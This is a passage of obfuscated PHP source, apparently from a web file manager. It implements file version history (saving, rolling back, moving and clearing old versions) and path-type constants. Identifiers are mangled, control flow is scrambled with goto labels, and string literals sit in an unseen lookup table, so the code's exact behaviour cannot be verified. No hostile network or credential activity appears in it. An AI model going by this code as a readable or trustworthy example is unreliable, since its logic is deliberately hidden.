$_SERVER[Öíæ€“”≠éÏË]; $cä÷ﬁ ‡îÀ = self::parsePath($Fïﬁ≥Ûç⁄∞[0]); if (!$cä÷ﬁ ‡îÀ) { return; } $B’ÿŸ–Ö¬í = self::checkInHistory($cä÷ﬁ ‡îÀ); if (!$B’ÿŸ–Ö¬í) { return; } if ($B’ÿŸ–Ö¬í[$aÜ¥º…∂ÙÛ[29]] == $aÜ¥º…∂ÙÛ[193]) { $e“¡„§˘ﬁ≥ = self::listData($cä÷ﬁ ‡îÀ); if ($e“¡„§˘ﬁ≥ && $e“¡„§˘ﬁ≥[$aÜ¥º…∂ÙÛ[367]]) { self::moveHistory($cä÷ﬁ ‡îÀ, $Fïﬁ≥Ûç⁄∞[1]); } } else { IO::rename($B’ÿŸ–Ö¬í[$aÜ¥º…∂ÙÛ[76]], $Fïﬁ≥Ûç⁄∞[1]); } } public static function eventBeforeMove($d”€¶ñ›îû) { goto D±‹¢Ùá“∂; CÒàÀË ∆ª: if ($Fâã≥˘·¥Ê[$DÆ‹¡ßô™á[29]] == $DÆ‹¡ßô™á[193]) { $eÕâ€µø§è = self::listData($dÍ¢ª›Òªé); $AòÆ‡æ√¥† = rtrim($aïπ∫‚óñﬂ, $DÆ‹¡ßô™á[8]) . $DÆ‹¡ßô™á[8] . ($a–ÙÕøÚ‡≠ ? $a–ÙÕøÚ‡≠ : get_path_this($dÍ¢ª›Òªé)); $c±Èˆ≤·ï◊ = self::listData($AòÆ‡æ√¥†); if ($eÕâ€µø§è && $eÕâ€µø§è[$DÆ‹¡ßô™á[367]] && $c±Èˆ≤·ï◊ && $c±Èˆ≤·ï◊[$DÆ‹¡ßô™á[367]]) { return self::clear($dÍ¢ª›Òªé); } if ($eÕâ€µø§è && $eÕâ€µø§è[$DÆ‹¡ßô™á[367]]) { self::moveHistory($dÍ¢ª›Òªé, $a–ÙÕøÚ‡≠, $eÉ∫È≠Â√Ã); } } else { IO::move($Fâã≥˘·¥Ê[$DÆ‹¡ßô™á[76]], $eÉ∫È≠Â√Ã, !1, $a–ÙÕøÚ‡≠); self::clearEmptyFolder(IO::pathFather($Fâã≥˘·¥Ê[$DÆ‹¡ßô™á[76]])); } goto AÜ”úõïíÊ; dï∫ÈøéœÙ: $aïπ∫‚óñﬂ = self::parsePath($d”€¶ñ›îû[1]); if (!$aïπ∫‚óñﬂ) { return; } $a–ÙÕøÚ‡≠ = $d”€¶ñ›îû[3]; goto d‹Ñ…ú˜ﬁØ; d‹Ñ…ú˜ﬁØ: $Fâã≥˘·¥Ê = self::checkInHistory($dÍ¢ª›Òªé); if (!$Fâã≥˘·¥Ê) { return; } $eÉ∫È≠Â√Ã = self::pathHistory($aïπ∫‚óñﬂ); goto CÒàÀË ∆ª; D±‹¢Ùá“∂: $DÆ‹¡ßô™á =& $_SERVER[Öíæ€“”≠éÏË]; $dÍ¢ª›Òªé = self::parsePath($d”€¶ñ›îû[0]); if (!$dÍ¢ª›Òªé) { return; } goto dï∫ÈøéœÙ; AÜ”úõïíÊ: } public static function eventAfterRemove($eŒ‹ÌﬁÙ˘˘, $fŒÀ÷âﬂ∫Ù) { goto F“©· ö∞Á; F“©· ö∞Á: $d—∞‚ÖÀíÚ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$fŒÀ÷âﬂ∫Ù) { return; } $f›ù°Íê»è = self::parsePath($eŒ‹ÌﬁÙ˘˘[0]); goto dó¥´◊øª; dó¥´◊øª: if (!$f›ù°Íê»è) { return; } $B ÃÚöπ⁄Ñ = self::checkInHistory($f›ù°Íê»è); if (!$B ÃÚöπ⁄Ñ) { return; } goto f–ã°àıı‰; f–ã°àıı‰: if ($B ÃÚöπ⁄Ñ[$d—∞‚ÖÀíÚ[29]] == $d—∞‚ÖÀíÚ[193]) { $c∑îÉ¥Ï∂∞ = self::listData($f›ù°Íê»è, !1); if ($c∑îÉ¥Ï∂∞ && $c∑îÉ¥Ï∂∞[$d—∞‚ÖÀíÚ[367]]) { self::clear($f›ù°Íê»è, !1); } } else { IO::remove($B ÃÚöπ⁄Ñ[$d—∞‚ÖÀíÚ[76]]); self::clearEmptyFolder(IO::pathFather($B ÃÚöπ⁄Ñ[$d—∞‚ÖÀíÚ[76]])); } goto f◊»’ˆ˜»ÿ; f◊»’ˆ˜»ÿ: } private static function checkInHistory($d‚‡ë •ƒ ) { $Eò≥£äü≠û = self::pathHistory($d‚‡ë •ƒ ); if (!IO::exist($Eò≥£äü≠û)) { $Eò≥£äü≠û .= $_SERVER[Öíæ€“”≠éÏË][1127]; } return IO::exist($Eò≥£äü≠û) ? IO::info($Eò≥£äü≠û) : !1; } private static function parsePath($dï©Û◊èØ§) { goto D–“ÖÁıª∑; FŸ›ıãä°ä: if (!$BÜÑ˜–£¬† || !$D¥âÇ«ü‚ú[$EØ◊êŒ¨›©[1129]]) { return !1; } if (substr($dï©Û◊èØ§, 0, strlen(DATA_PATH . $EØ◊êŒ¨›©[1130])) == DATA_PATH . $EØ◊êŒ¨›©[1130]) { return !1; } if ($f‰¢úÌ≈ÃÑ == KodIO::KOD_SHARE_ITEM) { $EÓÔªÌÀè = IO::init($dï©Û◊èØ§); if ($EÓÔªÌÀè->pathParse[$EØ◊êŒ¨›©[1057]]) { return self::parsePath($EÓÔªÌÀè->pathParse[$EØ◊êŒ¨›©[1057]]); } return !1; } goto f‹Úç∂ÁÒÎ; D–“ÖÁıª∑: $EØ◊êŒ¨›© =& $_SERVER[Öíæ€“”≠éÏË]; if (!$dï©Û◊èØ§) { return !1; } if ($GLOBALS[$EØ◊êŒ¨›©[1128]]) { return; } goto BàöÍ’„Ê†; f‹Úç∂ÁÒÎ: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $CõﬂÚ› üò = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $EØ◊êŒ¨›©[1131]); foreach ($CõﬂÚ› üò as $F‘»∏Èûè—) { if (!$f‰¢úÌ≈ÃÑ && substr($dï©Û◊èØ§, 0, strlen($F‘»∏Èûè—)) == $F‘»∏Èûè—) { return !1; } } goto F∑ÑÚÉæ≤œ; F∑ÑÚÉæ≤œ: self::log($GLOBALS[$EØ◊êŒ¨›©[1052]] . $EØ◊êŒ¨›©[1132] . $dï©Û◊èØ§); return $dï©Û◊èØ§; goto AùÎÈ†‡–¥; BàöÍ’„Ê†: $D¥âÇ«ü‚ú = KodIO::parse($dï©Û◊èØ§); $f‰¢úÌ≈ÃÑ = $D¥âÇ«ü‚ú[$EØ◊êŒ¨›©[29]]; $BÜÑ˜–£¬† = !$f‰¢úÌ≈ÃÑ || $f‰¢úÌ≈ÃÑ == KodIO::KOD_IO || $f‰¢úÌ≈ÃÑ == KodIO::KOD_SHARE_ITEM; goto FŸ›ıãä°ä; AùÎÈ†‡–¥: } private static function pathHistory($FÑ—»ÚÛ±ä) { $D´êò©Êí™ =& $_SERVER[Öíæ€“”≠éÏË]; $BñÔ√†úÎ› = self::$_historyBase . ltrim(KodIO::clear($FÑ—»ÚÛ±ä), $D´êò©Êí™[8]); $BñÔ√†úÎ› = str_replace(array($D´êò©Êí™[1133]), array($D´êò©Êí™[1134]), $BñÔ√†úÎ›); return $BñÔ√†úÎ›; } public static function log($CüöÌ‰ÉË—) { } public static function historyCount($AäìæÁﬁñõ) { $f·ÙëÍ∫ì§ =& $_SERVER[Öíæ€“”≠éÏË]; $a¡ﬁÏáÜîÿ = array(); $c™‡è¥í”ô = array(); foreach ($AäìæÁﬁñõ as $bËÑíé•È») { $e…“ΩÉªú† = get_path_father($bËÑíé•È»); if (!$c™‡è¥í”ô[$e…“ΩÉªú†]) { $c™‡è¥í”ô[$e…“ΩÉªú†] = array(); } $c™‡è¥í”ô[$e…“ΩÉªú†][] = get_path_this($bËÑíé•È»); } foreach ($c™‡è¥í”ô as $e…“ΩÉªú† => $F⁄ùÂ—éôÎ) { $EπÖÃäÃÉƒ = self::parsePath($e…“ΩÉªú†); if (!$EπÖÃäÃÉƒ) { continue; } foreach ($F⁄ùÂ—éôÎ as $C‘Øóã‰Í€) { $eΩËã≤Ü√Ñ = self::listData(rtrim($EπÖÃäÃÉƒ, $f·ÙëÍ∫ì§[8]) . $f·ÙëÍ∫ì§[8] . $C‘Øóã‰Í€, !1); if ($eΩËã≤Ü√Ñ && $eΩËã≤Ü√Ñ[$f·ÙëÍ∫ì§[367]]) { $a¡ﬁÏáÜîÿ[rtrim($e…“ΩÉªú†, $f·ÙëÍ∫ì§[8]) . $f·ÙëÍ∫ì§[8] . $C‘Øóã‰Í€] = count($eΩËã≤Ü√Ñ[$f·ÙëÍ∫ì§[367]]); } } } return $a¡ﬁÏáÜîÿ; } public static function add($BÌØïÍéØñ) { goto E±Ω√¥ãêõ; e–Ô‹„Çº¥: $Fçñü∏ÏÈÉ = Model($cÍ¯∞ñê¥ë[743])->get($cÍ¯∞ñê¥ë[1135]); $d‡”ÓÊáﬁÆ = $GLOBALS[$cÍ¯∞ñê¥ë[6]][$cÍ¯∞ñê¥ë[88]][$cÍ¯∞ñê¥ë[1113]]; $aº¥∏ıë“ö = $Fçñü∏ÏÈÉ == $cÍ¯∞ñê¥ë[1136] ? 5 : $d‡”ÓÊáﬁÆ; goto eåºº˜ºåÕ; E±Ω√¥ãêõ: $cÍ¯∞ñê¥ë =& $_SERVER[Öíæ€“”≠éÏË]; $e´∏é®„ëä = self::listData($BÌØïÍéØñ); if (!$e´∏é®„ëä) { return; } goto e–Ô‹„Çº¥; E÷¬»ßìË‡: return self::saveData($e´∏é®„ëä[$cÍ¯∞ñê¥ë[1140]], $BäÆçÑ¯ÈÚ); goto B’ﬂﬁÈÇÈÊ; cÒê‚∆æÎ≠: $BäÆçÑ¯ÈÚ = $e´∏é®„ëä[$cÍ¯∞ñê¥ë[367]]; if ($cç†Õ∆Ú†‰[$cÍ¯∞ñê¥ë[78]] == 0) { return; } if ($cç†Õ∆Ú†‰[$cÍ¯∞ñê¥ë[78]] >= 1024 * 1024 * 500) { return !1; } goto b¥‘∞ÖùÉ≥; b¥‘∞ÖùÉ≥: if ($BäÆçÑ¯ÈÚ && $BäÆçÑ¯ÈÚ[0][$cÍ¯∞ñê¥ë[171]] == $D≈¿∏õ∞Â€) { return !0; } if (array_key_exists($cÍ¯∞ñê¥ë[196], $cç†Õ∆Ú†‰) && !$cç†Õ∆Ú†‰[$cÍ¯∞ñê¥ë[196]]) { return !1; } $E≈›îÊÀı = short_id(time()); goto a€ÏÇëæ∫®; a€ÏÇëæ∫®: $B¿º∫›”áı = array($cÍ¯∞ñê¥ë[394] => $E≈›îÊÀı, $cÍ¯∞ñê¥ë[171] => $D≈¿∏õ∞Â€, $cÍ¯∞ñê¥ë[28] => $cç†Õ∆Ú†‰[$cÍ¯∞ñê¥ë[28]] . $cÍ¯∞ñê¥ë[95] . date($cÍ¯∞ñê¥ë[1137]) . rand_string(1), $cÍ¯∞ñê¥ë[78] => $cç†Õ∆Ú†‰[$cÍ¯∞ñê¥ë[78]], $cÍ¯∞ñê¥ë[433] => USER_ID, $cÍ¯∞ñê¥ë[194] => time(), $cÍ¯∞ñê¥ë[1138] => $cÍ¯∞ñê¥ë[33]); IO::mkdir($e´∏é®„ëä[$cÍ¯∞ñê¥ë[1139]]); $FøË§π∫îΩ = IO::copy($BÌØïÍéØñ, $e´∏é®„ëä[$cÍ¯∞ñê¥ë[1139]], !1, $B¿º∫›”áı[$cÍ¯∞ñê¥ë[28]]); goto E€ ãÀã¢í; eåºº˜ºåÕ: if ($d‡”ÓÊáﬁÆ <= 0) { return; } $D≈¿∏õ∞Â€ = IO::hashSimple($BÌØïÍéØñ); $cç†Õ∆Ú†‰ = IO::info($BÌØïÍéØñ); goto cÒê‚∆æÎ≠; E€ ãÀã¢í: if (!$FøË§π∫îΩ) { self::clearEmptyFolder($e´∏é®„ëä[$cÍ¯∞ñê¥ë[1139]]); return !1; } array_unshift($BäÆçÑ¯ÈÚ, $B¿º∫›”áı); if (count($BäÆçÑ¯ÈÚ) > $aº¥∏ıë“ö) { $Dà”ÿ°Ω√ù = array_slice($BäÆçÑ¯ÈÚ, $aº¥∏ıë“ö); foreach ($Dà”ÿ°Ω√ù as $f†ê≤ππà) { IO::remove($e´∏é®„ëä[$cÍ¯∞ñê¥ë[1139]] . $f†ê≤ππà[$cÍ¯∞ñê¥ë[28]]); } $BäÆçÑ¯ÈÚ = array_slice($BäÆçÑ¯ÈÚ, 0, $aº¥∏ıë“ö); } goto E÷¬»ßìË‡; B’ﬂﬁÈÇÈÊ: } public static function remove($a≠’ﬁ‘úë’, $dã¯À∞É) { $díÜ›Ñ·ÜŸ =& $_SERVER[Öíæ€“”≠éÏË]; $BŸÍúáñ§¨ = self::listData($a≠’ﬁ‘úë’); $e‘Áû≠…Ò£ = array(); if (!$BŸÍúáñ§¨) { return !1; } foreach ($BŸÍúáñ§¨[$díÜ›Ñ·ÜŸ[367]] as $DÿèóæÃ˜†) { if ($DÿèóæÃ˜†[$díÜ›Ñ·ÜŸ[394]] == $dã¯À∞É) { IO::remove($BŸÍúáñ§¨[$díÜ›Ñ·ÜŸ[1139]] . $DÿèóæÃ˜†[$díÜ›Ñ·ÜŸ[28]]); continue; } $e‘Áû≠…Ò£[] = $DÿèóæÃ˜†; } return self::saveData($BŸÍúáñ§¨[$díÜ›Ñ·ÜŸ[1140]], $e‘Áû≠…Ò£); } public static function clear($Eÿ–∂Øãâ–, $eÖ˜£ûÒóı = true) { $cä‰≈Â≤ˆè =& $_SERVER[Öíæ€“”≠éÏË]; $a±«Õ∆ÂøÁ = self::listData($Eÿ–∂Øãâ–, $eÖ˜£ûÒóı); if (!$a±«Õ∆ÂøÁ) { return !1; } foreach ($a±«Õ∆ÂøÁ[$cä‰≈Â≤ˆè[367]] as $Cäóôö≤ ò) { IO::remove($a±«Õ∆ÂøÁ[$cä‰≈Â≤ˆè[1139]] . $Cäóôö≤ ò[$cä‰≈Â≤ˆè[28]]); } return self::saveData($a±«Õ∆ÂøÁ[$cä‰≈Â≤ˆè[1140]], array()); } public static function moveHistory($AÃ£§ÀöÁı, $d‰”µ≤ÎóØ = '', $D⁄æÃëàÁÔ = '') { goto f°Úõ¢ÍΩÒ; fë”†à÷Àß: $C‰Úœ°ú¨” = $d¢Èµ›Ωß´[1127]; $d‰”µ≤ÎóØ = $d‰”µ≤ÎóØ ? $d‰”µ≤ÎóØ : get_path_this($AÃ£§ÀöÁı); $D⁄æÃëàÁÔ = $D⁄æÃëàÁÔ ? $D⁄æÃëàÁÔ : $a¡§ùº±õ¯[$d¢Èµ›Ωß´[1139]]; goto cßæüè•˘€; F¬äΩ¶•Ëú: self::saveData($a¡§ùº±õ¯[$d¢Èµ›Ωß´[1140]], $a¡§ùº±õ¯[$d¢Èµ›Ωß´[367]]); self::clearEmptyFolder($a¡§ùº±õ¯[$d¢Èµ›Ωß´[1139]]); goto F´˜Ω¨∫õÓ; f°Úõ¢ÍΩÒ: $d¢Èµ›Ωß´ =& $_SERVER[Öíæ€“”≠éÏË]; $a¡§ùº±õ¯ = self::listData($AÃ£§ÀöÁı, !1); if (!$a¡§ùº±õ¯ || !$a¡§ùº±õ¯[$d¢Èµ›Ωß´[367]]) { return !1; } goto fë”†à÷Àß; cßæüè•˘€: $EÀß∂öü Ö = substr(get_path_this($a¡§ùº±õ¯[$d¢Èµ›Ωß´[1140]]), 0, -strlen($C‰Úœ°ú¨”)); foreach ($a¡§ùº±õ¯[$d¢Èµ›Ωß´[367]] as $F‘¢ﬁÉ‚˘Ç => $bàùœ£êı) { $b÷≥‘ÑÍ™º = $d‰”µ≤ÎóØ . substr($bàùœ£êı[$d¢Èµ›Ωß´[28]], strlen($EÀß∂öü Ö)); $B»–ÙÁˆ≥‡ = IO::move($a¡§ùº±õ¯[$d¢Èµ›Ωß´[1139]] . $bàùœ£êı[$d¢Èµ›Ωß´[28]], $D⁄æÃëàÁÔ, !1, $b÷≥‘ÑÍ™º); if ($B»–ÙÁˆ≥‡) { $a¡§ùº±õ¯[$d¢Èµ›Ωß´[367]][$F‘¢ﬁÉ‚˘Ç][$d¢Èµ›Ωß´[28]] = $b÷≥‘ÑÍ™º; } } $a¡§ùº±õ¯[$d¢Èµ›Ωß´[1140]] = IO::move($a¡§ùº±õ¯[$d¢Èµ›Ωß´[1140]], $D⁄æÃëàÁÔ, !1, $d‰”µ≤ÎóØ . $C‰Úœ°ú¨”); goto F¬äΩ¶•Ëú; F´˜Ω¨∫õÓ: } public static function rollback($e©Û¯ﬁ‹…◊, $CæÛ◊Ÿ©”Î) { $fáé±¯”‹¥ =& $_SERVER[Öíæ€“”≠éÏË]; $b‡∫å°ÏÎË = self::listData($e©Û¯ﬁ‹…◊); if (!$b‡∫å°ÏÎË) { return; } $FÆãú¯œ≤˜ = IO::info($e©Û¯ﬁ‹…◊); foreach ($b‡∫å°ÏÎË[$fáé±¯”‹¥[367]] as $Eç˘éç™£π => $CΩ§ÓÈÂ…∞) { if ($CΩ§ÓÈÂ…∞[$fáé±¯”‹¥[394]] == $CæÛ◊Ÿ©”Î) { self::add($e©Û¯ﬁ‹…◊); $f√¯Ø∑óîˆ = $b‡∫å°ÏÎË[$fáé±¯”‹¥[1139]] . $CΩ§ÓÈÂ…∞[$fáé±¯”‹¥[28]]; $A⁄åõ˜úãÒ = IO::copy($f√¯Ø∑óîˆ, IO::pathFather($e©Û¯ﬁ‹…◊), REPEAT_REPLACE, $FÆãú¯œ≤˜[$fáé±¯”‹¥[28]]); if ($A⁄åõ˜úãÒ) { self::remove($e©Û¯ﬁ‹…◊, $CæÛ◊Ÿ©”Î); } return $A⁄åõ˜úãÒ; } } return !1; } public static function setDetail($D“Üõ∑™—ì, $bß’ìÚ¨…≈, $eÀ€îÛŒÙÈ) { $B¡‚ß–‹·À =& $_SERVER[Öíæ€“”≠éÏË]; $a›˜§ØΩ¿ÿ = self::listData($D“Üõ∑™—ì); if (!$a›˜§ØΩ¿ÿ) { return; } foreach ($a›˜§ØΩ¿ÿ[$B¡‚ß–‹·À[367]] as $aœ´÷œä’π => $FﬁÙƒÒÈÛÍ) { if ($FﬁÙƒÒÈÛÍ[$B¡‚ß–‹·À[394]] == $bß’ìÚ¨…≈) { $a›˜§ØΩ¿ÿ[$B¡‚ß–‹·À[367]][$aœ´÷œä’π][$B¡‚ß–‹·À[1138]] = $eÀ€îÛŒÙÈ; self::saveData($a›˜§ØΩ¿ÿ[$B¡‚ß–‹·À[1140]], $a›˜§ØΩ¿ÿ[$B¡‚ß–‹·À[367]]); return !0; } } return !1; } public static function fileInfo($cñù âè´π, $C›Öæ™Â˘à) { goto A¡‰Ò©õ«œ; A¡‰Ò©õ«œ: $Eò∫òä•Ø  =& $_SERVER[Öíæ€“”≠éÏË]; $DÌÈÍº√‚Ò = self::listData($cñù âè´π); if (!$DÌÈÍº√‚Ò) { show_json(LNG($Eò∫òä•Ø [105]), !1); } goto FàÑëˆı«ƒ; FàÑëˆı«ƒ: $EÓ…Í¥â™‚ = $Eò∫òä•Ø [33]; foreach ($DÌÈÍº√‚Ò[$Eò∫òä•Ø [367]] as $aåﬂŒÕœö∑ => $bÚ¥«ß∑ãé) { if ($bÚ¥«ß∑ãé[$Eò∫òä•Ø [394]] != $C›Öæ™Â˘à) { continue; } $EÓ…Í¥â™‚ = $DÌÈÍº√‚Ò[$Eò∫òä•Ø [1139]] . $bÚ¥«ß∑ãé[$Eò∫òä•Ø [28]]; break; } if (!$EÓ…Í¥â™‚) { show_json(LNG($Eò∫òä•Ø [105]), !1); } goto F£Õèá≠ÆÖ; F£Õèá≠ÆÖ: return IO::info($EÓ…Í¥â™‚); goto dù«î≤ŒÍé; dù«î≤ŒÍé: } public static function fileOut($f¢¿áﬁ¯√è, $A“±∞áåÆí, $CŸ¶ÊÁ√⁄≠ = false) { $cÁ¢¥ÑáÍ† =& $_SERVER[Öíæ€“”≠éÏË]; $dÔêµá∂®‹ = self::fileInfo($f¢¿áﬁ¯√è, $A“±∞áåÆí); $BÓë¥∫·ÀÏ =& $GLOBALS[$cÁ¢¥ÑáÍ†[7]]; $CŸ¶ÊÁ√⁄≠ = isset($BÓë¥∫·ÀÏ[$cÁ¢¥ÑáÍ†[1103]]) && $BÓë¥∫·ÀÏ[$cÁ¢¥ÑáÍ†[1103]] == 1; if (isset($BÓë¥∫·ÀÏ[$cÁ¢¥ÑáÍ†[29]]) && $BÓë¥∫·ÀÏ[$cÁ¢¥ÑáÍ†[29]] == $cÁ¢¥ÑáÍ†[1141]) { return IO::fileOutImage($dÔêµá∂®‹[$cÁ¢¥ÑáÍ†[76]], $BÓë¥∫·ÀÏ[$cÁ¢¥ÑáÍ†[1142]]); } IO::fileOut($dÔêµá∂®‹[$cÁ¢¥ÑáÍ†[76]], $CŸ¶ÊÁ√⁄≠, get_path_this($f¢¿áﬁ¯√è)); } public static function listData($E‰È†∆‹Í∂, $BêπÚçÔ±È = true) { goto Eﬁêœ∏Í√£; Eﬁêœ∏Í√£: $eéŸÌìè¿« =& $_SERVER[Öíæ€“”≠éÏË]; if ($BêπÚçÔ±È && !IO::exist($E‰È†∆‹Í∂)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto b≠†à£çâá; Dôÿ¨ŸÀÉú: $fáÀı§£°‡ = IO::getContent($cä‰ì “æ¢[$eéŸÌìè¿«[1140]]); if ($fáÀı§£°‡) { $b•Œ¯ƒπÇ£ = json_decode($fáÀı§£°‡, !0); if (is_array($b•Œ¯ƒπÇ£)) { $cä‰ì “æ¢[$eéŸÌìè¿«[367]] = $b•Œ¯ƒπÇ£; } } return $cä‰ì “æ¢; goto eƒºûÂ≥ºÊ; b≠†à£çâá: if (substr($E‰È†∆‹Í∂, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $dΩŸÍÆõÙä = self::pathHistory($E‰È†∆‹Í∂); $cä‰ì “æ¢ = array($eéŸÌìè¿«[1140] => $dΩŸÍÆõÙä . $eéŸÌìè¿«[1127], $eéŸÌìè¿«[1139] => rtrim(get_path_father($dΩŸÍÆõÙä), $eéŸÌìè¿«[8]) . $eéŸÌìè¿«[8], $eéŸÌìè¿«[367] => array()); goto Dôÿ¨ŸÀÉú; eƒºûÂ≥ºÊ: } private static function saveData($AëßÉÈõ‚, $D≤∑¶‰ë∞Û) { goto FÂ–‘ﬂÑ¨¡; B≤∫¡¥∞ÒΩ: $c–óÔ£¿Ë¨ = IO::pathFather($AëßÉÈõ‚); IO::remove($AëßÉÈõ‚); self::clearEmptyFolder($c–óÔ£¿Ë¨); goto d≠Ω∆¬ƒ◊; FÂ–‘ﬂÑ¨¡: $D¥»”Ì´ﬂ¶ =& $_SERVER[Öíæ€“”≠éÏË]; self::log($D¥»”Ì´ﬂ¶[1143] . $AëßÉÈõ‚ . $D¥»”Ì´ﬂ¶[68] . count($D≤∑¶‰ë∞Û), $D¥»”Ì´ﬂ¶[725]); if ($D≤∑¶‰ë∞Û) { return IO::setContent($AëßÉÈõ‚, json_encode($D≤∑¶‰ë∞Û)); } goto B≤∫¡¥∞ÒΩ; d≠Ω∆¬ƒ◊: return !0; goto FŸﬁÏäã≤û; FŸﬁÏäã≤û: } public static function clearEmptyFolder($C«Üü®ï≠á) { goto aÒüö÷ª…ó; e¬àá‰±∑ô: $D›…π¨îñ™ = IO::has($C«Üü®ï≠á, !0); if ($D›…π¨îñ™[$DÒÉô≈ë¶‘[203]] > 0 || $D›…π¨îñ™[$DÒÉô≈ë¶‘[204]] > 0) { return; } IO::remove($C«Üü®ï≠á); goto FΩà∆ò•¶å; FΩà∆ò•¶å: self::clearEmptyFolder($EÇÖç⁄¡ˆû); goto D„èÙøŸÊ∑; aÒüö÷ª…ó: $DÒÉô≈ë¶‘ =& $_SERVER[Öíæ€“”≠éÏË]; if (trim($C«Üü®ï≠á, $DÒÉô≈ë¶‘[8]) == trim(self::$_historyBase, $DÒÉô≈ë¶‘[8])) { return; } $EÇÖç⁄¡ˆû = IO::pathFather($C«Üü®ï≠á); goto e¬àá‰±∑ô; D„èÙøŸÊ∑: } private static function getBasePath() { goto D¨”æ‰Ááè; BÆ∞Ûû…ÍÙ: return $C®Çà’°¿·; goto aÒœªüéçè; a∏§¢«êò¨: file_put_contents($C®Çà’°¿· . $B∞∑æê≥∫µ[1147], $B∞∑æê≥∫µ[33]); file_put_contents(DATA_PATH . $B∞∑æê≥∫µ[1147], $B∞∑æê≥∫µ[33]); Model($B∞∑æê≥∫µ[1144])->set($B∞∑æê≥∫µ[1145], $C®Çà’°¿·); goto BÆ∞Ûû…ÍÙ; D¨”æ‰Ááè: $B∞∑æê≥∫µ =& $_SERVER[Öíæ€“”≠éÏË]; $C®Çà’°¿· = Model($B∞∑æê≥∫µ[1144])->get($B∞∑æê≥∫µ[1145]); if ($C®Çà’°¿·) { if (!IO::exist($C®Çà’°¿·)) { IO::mkdir($C®Çà’°¿·); } if (get_path_this($C®Çà’°¿·) == $B∞∑æê≥∫µ[1130]) { $aÜ∆„Çè∏Ê = $B∞∑æê≥∫µ[1146] . rand_string(8); @rename($C®Çà’°¿·, get_path_father($C®Çà’°¿·) . $B∞∑æê≥∫µ[8] . $aÜ∆„Çè∏Ê); $C®Çà’°¿· = DATA_PATH . $aÜ∆„Çè∏Ê . $B∞∑æê≥∫µ[8]; file_put_contents(DATA_PATH . $B∞∑æê≥∫µ[1147], $B∞∑æê≥∫µ[33]); Model($B∞∑æê≥∫µ[1144])->set($B∞∑æê≥∫µ[1145], $C®Çà’°¿·); } return $C®Çà’°¿·; } goto dÂ—Ïòœﬂ⁄; dÂ—Ïòœﬂ⁄: $C®Çà’°¿· = DATA_PATH . $B∞∑æê≥∫µ[1146] . rand_string(8) . $B∞∑æê≥∫µ[8]; $C®Çà’°¿· = IO::mkdir($C®Çà’°¿·); $C®Çà’°¿· = rtrim($C®Çà’°¿·, $B∞∑æê≥∫µ[8]) . $B∞∑æê≥∫µ[8]; goto a∏§¢«êò¨; aÒœªüéçè: } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\162\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\163\x65\x72\x52\x65\x63\x79\143\154\145\x7d"; const KOD_USER_FAV = "\173\165\163\x65\x72\106\141\x76\175"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\162\106\151\154\145\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\x65\x72\106\x69\x6c\145\x54\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\165\x70\122\157\x6f\164\x53\x65\154\x66\x7d"; const KOD_USER_SHARE = "\173\x75\x73\145\162\x53\150\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\x72\123\x68\141\162\145\114\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\145\124\x6f\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\x72\x65\x49\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\163\x68\141\162\145\111\164\x65\x6d\x4c\x69\x6e\x6b\x7d"; const KOD_SEARCH = "\x7b\x73\x65\x61\x72\x63\x68\175"; const KOD_BLOCK = "\x7b\142\x6c\x6f\143\153\x7d"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\165\x73\x65\162\122\145\156\x63\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\144\x72\x69\x76\145\x72\175"; public static function typeList() { $dæÒÜ‡©¨© =& $_SERVER[Öíæ€“”≠éÏË]; return array($dæÒÜ‡©¨©[1148] => self::KOD_SOURCE, $dæÒÜ‡©¨©[1149] => self::KOD_USER_RECYCLE, $dæÒÜ‡©¨©[1150] => self::KOD_USER_FAV, $dæÒÜ‡©¨©[1151] => self::KOD_USER_FILE_TAG, $dæÒÜ‡©¨©[1152] => self::KOD_USER_FILE_TYPE, $dæÒÜ‡©¨©[1153] => self::KOD_GROUP_ROOT_SELF, $dæÒÜ‡©¨©[1154] => self::KOD_USER_SHARE, $dæÒÜ‡©¨©[1155] => self::KOD_USER_SHARE_LINK, $dæÒÜ‡©¨©[1156] => self::KOD_USER_SHARE_TO_ME, $dæÒÜ‡©¨©[1157] => self::KOD_SHARE_ITEM, $dæÒÜ‡©¨©[1158] => self::KOD_SHARE_LINK, $dæÒÜ‡©¨©[1159] => self::KOD_SEARCH, $dæÒÜ‡©¨©[1160] => self::KOD_BLOCK, $dæÒÜ‡©¨©[1161] => self::KOD_IO, $dæÒÜ‡©¨©[1162] => self::KOD_USER_RECENT, $dæÒÜ‡©¨©[1163] => self::KOD_USER_DRIVER); } public static function parse($B°’§¯æ∫›) { goto Eﬁ√»≈Ö÷–; fïíÿ˜˜ÓÁ: $cüÚÛ™ªë‘ = array($F§È–ÎÒ∆°[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $c¥Õ˜èîÎ≤[$F§È–ÎÒ∆°[1129]] = in_array($c¥Õ˜èîÎ≤[$F§È–ÎÒ∆°[29]], $cüÚÛ™ªë‘); return $c¥Õ˜èîÎ≤; goto dƒ€ÜÜ◊Çè; Eﬁ√»≈Ö÷–: $F§È–ÎÒ∆° =& $_SERVER[Öíæ€“”≠éÏË]; $B°’§¯æ∫› = self::clear($B°’§¯æ∫›); $F≥àõÓﬂ”ä = array_values(self::typeList()); goto fΩŒó’Ù˘≠; fΩŒó’Ù˘≠: preg_match($F§È–ÎÒ∆°[1164], $B°’§¯æ∫›, $dìû¥Â»ë); $c¥Õ˜èîÎ≤ = array($F§È–ÎÒ∆°[416] => !1, $F§È–ÎÒ∆°[1165] => !1, $F§È–ÎÒ∆°[413] => 